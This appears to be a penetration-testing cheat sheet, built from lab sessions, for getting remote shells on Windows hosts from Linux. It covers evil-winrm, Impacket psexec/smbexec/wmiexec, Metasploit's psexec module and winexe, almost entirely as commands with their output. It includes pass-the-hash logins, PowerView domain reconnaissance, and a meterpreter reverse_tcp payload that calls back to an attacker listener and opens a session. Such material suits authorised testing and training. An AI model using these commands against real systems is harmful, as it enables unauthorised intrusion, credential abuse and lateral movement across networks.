# Windows Remote Access
## Windows shell from Linux
### evil-winrm
evil-winrm
```
evil-winrm -i example.htb -u ryan -p Password123
```
Example output:
```
$ evil-winrm -i example.htb -u ryan -p Password123
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\ryan\Documents>
```
Example 2 (using IP address):
```
$ evil-winrm -i 10.129.241.38 -u emily -p Password123
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\emily\Documents> cd ..
```
Specify a scripts folder to stage shared folders<br>
For example, PowerSploit
```
$ evil-winrm -i 10.129.240.61 -u svc-account -p redacted -s /usr/share/windows-resources/powersploit/Recon
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc-account\Documents> PowerView.ps1
*Evil-WinRM* PS C:\Users\svc-account\Documents> get-domain


Forest                  : htb.local
DomainControllers       : {EXAMPLE.htb.local}
Children                : {}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  :
PdcRoleOwner            : EXAMPLE.htb.local
RidRoleOwner            : EXAMPLE.htb.local
InfrastructureRoleOwner : EXAMPLE.htb.local
Name                    : htb.local



*Evil-WinRM* PS C:\Users\svc-account\Documents>
```
### psexec.py
psexec.py
```
psexec.py MARVEL.local/administrator@example.htb
```
Example output:
```
$ psexec.py MARVEL.local/administrator@example.htb
Impacket v0.13.0.dev0+20240916.171021.65b774d - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Requesting shares on example.htb.....
[*] Found writable share ADMIN$
[*] Uploading file CPSFzOAa.exe
[*] Opening SVCManager on example.htb.....
[*] Creating service mFYM on example.htb.....
[*] Starting service mFYM.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32> 
```
Pass the hash:
```
$ /usr/local/bin/psexec.py administrator@10.129.240.61 -hashes redacted:redacted
Impacket v0.13.0.dev0+20240916.171021.65b774d - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.129.240.61.....
[*] Found writable share ADMIN$
[*] Uploading file BSlkyprb.exe
[*] Opening SVCManager on 10.129.240.61.....
[*] Creating service hRgS on 10.129.240.61.....
[*] Starting service hRgS.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32> 
```

### msf psexec
Metasploit psexec (windows/smb/psexec)
```
use exploit/windows/smb/psexec
```
Example output:
```
msf6 exploit(windows/smb/psexec) > set payload payload/windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/psexec) > options

Module options (exploit/windows/smb/psexec):

   Name                  Current Setting  Required  Description
   ----                  ---------------  --------  -----------
   RHOSTS                example.local    yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT                 445              yes       The SMB service port (TCP)
   SERVICE_DESCRIPTION                    no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                   no        The service display name
   SERVICE_NAME                           no        The service name
   SMBDomain             .                no        The Windows domain to use for authentication
   SMBPass               Password123      no        The password for the specified username
   SMBSHARE                               no        The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
   SMBUser               Administrator    no        The username to authenticate as


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.22.2       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   1   PowerShell


msf6 exploit(windows/smb/psexec) > exploit

[*] Started reverse TCP handler on 10.10.22.2:4444 
[*] 10.4.27.211:445 - Connecting to the server...
[*] 10.4.27.211:445 - Authenticating to 10.4.27.211:445 as user 'Administrator'...
[*] 10.4.27.211:445 - Executing the payload...
[+] 10.4.27.211:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (200262 bytes) to 10.4.27.211
[*] Meterpreter session 6 opened (10.10.22.2:4444 -> 10.4.27.211:49790 ) at 2023-08-28 04:49:53 +0530

meterpreter >
```
### smbexec.py
smbexec.py
```
smbexec.py Administrator:'Password123'@example.local
```
Example output:
```
root@attackdefense:~# smbexec.py Administrator:'Password123'@example.local
Impacket v0.9.25.dev1+20220131.200424.badf09d - Copyright 2021 SecureAuth Corporation

[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>
```
### wmiexec.py
```
wmiexec.py example.htb/administrator:Password123@10.129.237.154
```
Example output:
```
$ wmiexec.py example.htb/administrator:Password123@10.129.237.154
Impacket v0.13.0.dev0+20240916.171021.65b774d - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv2.1 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>
```

### winexe
```
winexe -U Administrator%Welcome123! //10.10.15.200 cmd.exe
```
Options:
```
$ winexe                                                                                       
winexe version 4.21
This program may be freely redistributed under the terms of the GNU GPLv3
Usage: winexe [OPTION]... //HOST[:PORT] COMMAND
Options:
      --uninstall                              Uninstall winexe service after remote execution
      --reinstall                              Reinstall winexe service before remote execution
      --runas=[DOMAIN\]USERNAME%PASSWORD       Run as the given user (BEWARE: this password is sent in cleartext over the network!)
      --runas-file=FILE                        Run as user options defined in a file
      --interactive=0|1                        Desktop interaction: 0 - disallow, 1 - allow. If allow, also use the --system switch (Windows
                                               requirement). Vista does not support this option.
      --ostype=0|1|2                           OS type: 0 - 32-bit, 1 - 64-bit, 2 - winexe will decide. Determines which version (32-bit or 64-bit) of
                                               service will be installed.

Help options:
  -?, --help                                   Show this help message
      --usage                                  Display brief usage message

Common Samba options:
  -d, --debuglevel=DEBUGLEVEL                  Set debug level
      --debug-stdout                           Send debug output to standard output
  -s, --configfile=CONFIGFILE                  Use alternative configuration file
      --option=name=value                      Set smb.conf option from command line
  -l, --log-basename=LOGFILEBASE               Basename for log/debug files
      --leak-report                            enable talloc leak reporting on exit
      --leak-report-full                       enable full talloc leak reporting on exit

Credential options:
  -U, --user=[DOMAIN/]USERNAME[%PASSWORD]      Set the network username
  -N, --no-pass                                Don't ask for a password
      --password=STRING                        Password
      --pw-nt-hash                             The supplied password is the NT hash
  -A, --authentication-file=FILE               Get the credentials from a file
  -P, --machine-pass                           Use stored machine account password
      --simple-bind-dn=DN                      DN to use for a simple bind
      --use-kerberos=desired|required|off      Use Kerberos authentication
      --use-krb5-ccache=CCACHE                 Credentials cache location for Kerberos
      --use-winbind-ccache                     Use the winbind ccache for authentication
      --client-protection=sign|encrypt|off     Configure used protection for client connections

Version options:
  -V, --version                                Print version
                                                                                                                                                          
$
```
